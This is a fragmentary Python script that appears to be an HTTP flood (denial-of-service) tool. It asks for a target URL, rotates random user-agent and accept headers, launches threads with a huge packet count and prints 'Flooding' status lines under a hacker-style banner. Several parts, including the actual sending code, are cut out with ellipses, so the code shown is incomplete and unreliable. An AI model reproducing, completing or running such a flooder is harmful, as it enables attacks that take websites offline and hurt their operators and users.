import urllib.parse,sys,socket,threading,random,time
useragents = [
...
url = input("URL : ")
packate = int(10000000000000000000000000000)#int(input("packate 100 / :"))
...
banner='''
        ...
        \33[92m    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ v.2\33[93m
            '''
useragentsuseragents = random.choice(useragents)
accept = random.choice(acceptall)
connection = "Connection: Keep-Alive\r\n" 
print(banner)
print(connection)
print(accept)
print("User-Agent: " + useragentsuseragents)
awaits = threading.Event()
def raw():
    useragent = "User-Agent: " + useragentsuseragents + "\r\n" 
...
for i in range(th):
    ...
    if n>=4:
        n = 0
    # time.sleep(0.1)
    sys.stdout.write("["+str(key[n])+"]Flooding "+url+"\r")
    sys.stdout.flush()
    n +=1
